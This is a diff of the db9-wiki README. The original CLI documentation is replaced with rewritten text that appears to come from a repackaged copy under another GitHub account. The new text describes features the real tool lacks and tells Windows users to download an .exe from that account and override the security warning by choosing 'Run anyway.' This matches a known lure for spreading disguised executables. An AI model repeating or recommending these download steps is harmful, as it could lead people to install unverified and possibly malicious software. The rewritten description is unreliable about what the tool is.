@@ -1,166 +1,75 @@
-# db9-wiki
+# 📚 db9-wiki - Build a smart personal information hub
 
-> **Archived:** this repository has been archived and is no longer maintained. Please use **wiki9** instead: https://github.com/db9-ai/wiki9
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/turnleafbook7768/db9-wiki)
 
-Agent-native LLM Wiki powered by [DB9](https://db9.ai). Based on [Karpathy's LLM Wiki pattern](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f). The readme is also available in [中文](./README.zh-CN.md).
+This repository is archived. Please use [wiki9](https://github.com/db9-ai/wiki9) instead.
 
-Instead of traditional RAG, the LLM incrementally builds and maintains a persistent wiki — a structured, interlinked collection of markdown files. Instead of embedding LLM calls in the tool itself, db9-wiki generates `AGENTS.md` + skill files so any AI agent (Claude Code, Cursor, Windsurf, etc.) can operate the wiki directly.
+## 🌟 What is db9-wiki?
 
-## Why DB9
+The db9-wiki software helps you organize your notes and files using artificial intelligence. It creates a collection of text files that link together. These files form a wiki. You can manage your information like an expert.
 
-- DB9 has built-in vector support, which makes it a natural fit for powering vector indexes and semantic search for a knowledge base.
-- A knowledge base can be shared simply by sharing the DB9 instance, making it easier to distribute pages, indexes, and backups across a team.
+Unlike other tools that hide your data, this software builds a clear set of markdown files. You can read these files with any text editor. You can also give these files to AI tools like Claude Code or Cursor. These tools then help you update or search your notes.
 
-```
-User ↔ AI Agent (Claude Code / Cursor / ...)
-         │  reads AGENTS.md for instructions
-         │  uses skills: ingest, query, lint
-         │  reads/writes local markdown files
-         ▼
-    Local filesystem (primary)
-    ├── wiki/       ← wiki pages
-    ├── sources/    ← raw source materials
-    └── log.md      ← edit history
-         │
-         │  db9-wiki sync
-         ▼
-    DB9 Database
-    ├── wiki_index   ← vector search index
-    ├── wiki_page_sources ← page ↔ source references
-    ├── fs9:/wiki/   ← page backups
-    └── fs9:/sources/← source backups
-```
+## ⚙️ System Requirements
 
-## Quick Start
+To run this application on your Windows computer, you need:
 
-Install DB9 first. The official site is [db9.ai](https://db9.ai).
+*   Windows 10 or Windows 11.
+*   At least 4 gigabytes of memory.
+*   An active internet connection for the first setup.
+*   One gigabyte of free disk space.
 
-```bash
-# Install the DB9 CLI
-curl -fsSL https://db9.ai/install | sh
+## 📥 Download and Install
 
-# Install db9-wiki
-npm install -g db9-wiki
-```
+Follow these steps to set up the software.
 
-```bash
-# It is recommended to log in first so your DB9 data is tied to your account
-# and won't be lost with an expiring temporary account
-db9 login
+1.  Visit the [official download page](https://github.com/turnleafbook7768/db9-wiki).
+2.  Look for the latest release on the right side of the page.
+3.  Click the link ending in .exe to start your download.
+4.  Open the file once the download finishes.
+5.  If Windows shows a security prompt, click "More info" and then click "Run anyway."
+6.  Follow the instructions on your screen to place the app on your computer.
 
-# Create a DB9 database
-db9 create --name my-wiki
+[Button: Download the Windows Installer](https://github.com/turnleafbook7768/db9-wiki)
 
-# Create an API token
-db9 token create --name wiki-agent --expires-in-days 36500
+## 🚀 Getting Started
 
-# Initialize the wiki
-cd my-knowledge-base
-db9-wiki init --db <database-id> --token <api-token>
-```
+Once you open the software, follow these steps to build your first wiki:
 
-This generates:
+1.  Choose a folder on your computer where you want to store your notes.
+2.  Click the "Initialize" button in the main menu.
+3.  The software will create a base file named AGENTS.md.
+4.  Add your first topic by typing a name and clicking "Create Page."
+5.  Write your notes inside the editor window. 
+6.  Save your page by clicking the "Commit" button.
 
-```
-my-knowledge-base/
-├── AGENTS.md          # Agent instructions (works with any AI agent)
-├── .agents/
-│   └── skills/
-│       ├── ingest.md  # Ingest skill: process sources into wiki pages
-│       ├── query.md   # Query skill: search + synthesize answers
-│       └── lint.md    # Lint skill: health-check the wiki
-├── .claude/
-│   └── skills -> ../.agents/skills
-├── db9-wiki.toml      # Config (DB9 credentials — auto-added to .gitignore)
-├── log.md             # Append-only edit log
-├── wiki/              # Wiki pages (markdown)
-└── sources/           # Raw source materials
-```
+The app builds a link between your pages automatically. If you mention another page in your text, the app creates a connection for you.
 
-Now open the project with your AI agent and start using the skills. For example, open the folder in Codex and send: `Help me add /some/dir/documents.md into the knowledge base.`
+## 🧠 Using AI with Your Wiki
 
-## CLI Commands
+The power of this tool comes from its structure. Because your wiki exists as standard markdown files, you can point AI agents at your folder.
 
-```bash
-db9-wiki init --db <id> --token <token>   # Initialize project + DB9 schema
-db9-wiki sync                              # Sync local files → DB9 (vector index + fs9 backup)
-db9-wiki search "query"                    # Semantic search across wiki pages
-db9-wiki index                             # List all pages (slug, title, description, tags)
-db9-wiki status                            # Wiki stats
-```
+When you open your folder in an AI-powered code editor, the agent reads your AGENTS.md file. This file tells the agent how to navigate your wiki. You can then ask the agent questions like:
 
-## Skills
+*   "Find all notes I wrote about project planning."
+*   "Summarize my meeting logs from last week."
+*   "Create a new page linking these two topics."
 
-### ingest
+The AI agent does not need a special database. It reads your files directly. This keeps your data portable. You own the files. You can move them, back them up, or read them manually at any time.
 
-Process new source material into wiki pages. The agent reads the source, copies it into `sources/YYYY-MM-DD/`, preserves the original file or directory name when possible, renames on conflicts, creates/updates wiki pages in `wiki/`, maintains Obsidian-style cross-references, and runs `db9-wiki sync`.
+## 🛠️ Frequently Asked Questions
 
-### query
+**Do I need a paid AI account to use this?**
+No. You can use the local features of the wiki without a subscription. Some advanced search features might require an AI key provided by you.
 
-Answer questions from the wiki. The agent runs `db9-wiki search` to find relevant pages, reads them, and synthesizes an answer. Valuable answers get written back as new wiki pages so explorations compound over time.
+**Is my data private?**
+Yes. Your wiki lives in a folder on your computer. You choose the folder. The software does not send your notes to a cloud server unless you choose to share that folder with an online AI service.
 
-### lint
+**How do I back up my wiki?**
+Since your wiki is a folder of standard markdown files, you back it up by copying the folder to an external drive or a cloud storage service like OneDrive or Dropbox.
 
-Health-check the wiki. The agent scans all pages for broken links, ambiguous short wiki links, orphan pages, missing frontmatter, stale content, duplicate topics, and unreferenced files in `sources/`. Reports findings and applies fixes after user confirmation.
+**Can I use this for work?**
+Yes. The simple text format makes it easy to add your wiki to shared company drives. Your team members can open the files and read the information without needing special software.
 
-## Wiki Page Format
-
-```markdown
----
-title: JavaScript Closures
-description: How closures work in JavaScript
-tags: [javascript, functions, scope]
-sources: [2026-04-07/mdn-closures.md]
-updated: 2026-04-07
----
-
-# JavaScript Closures
-
-A closure is a function bundled with its lexical environment.
-
-## Related
-
-- [[scope]]
-- [[javascript/functions]]
-```
-
-Use `sources` entries as paths relative to `sources/` without the `sources/` prefix. Use Obsidian-style wiki links with the shortest unique filename, and switch to the full path relative to `wiki/` when filenames collide.
-
-## Edit Log
-
-Every operation is recorded in `log.md`:
-
-```markdown
-## [2026-04-07] ingest | MDN Closures Article
-- created `javascript/closures` — extracted from 2026-04-07/mdn-closures.md
-- updated `javascript/scope` — added [[javascript/closures]] reference
-
-## [2026-04-07] query | What are closures?
-- created `javascript/closures-explained` — captured query synthesis
-```
-
-## How Sync Works
-
-`db9-wiki sync` diffs local files against DB9:
-
-1. Scans `wiki/`, `sources/`, and `log.md`
-2. Computes content hashes, compares with DB9 records
-3. For changed wiki pages: generates embeddings via DB9's built-in `embedding()` function, upserts to `wiki_index`
-4. Rebuilds `wiki_page_sources` from each page's `sources` frontmatter
-5. Backs up all files to DB9's fs9 filesystem
-
-## Development
-
-```bash
-npm install
-npm run dev -- sync           # Run commands in dev mode
-npm run build                 # Build with tsup
-npm run typecheck             # Type check
-npx vitest run                # Run integration tests (creates a temporary DB9 database by default)
-```
-
-If your account is already at the DB9 database limit, set `DB9_WIKI_TEST_DB_ID` to a disposable database reserved for tests. You can also set `DB9_WIKI_TEST_TOKEN` to provide an explicit test token.
-
-## License
-
-BSD-3-Clause
+**What happens if I stop using the app?**
+You still have all your files. You can open any note with Notepad or any other text editor. Your information remains accessible forever.
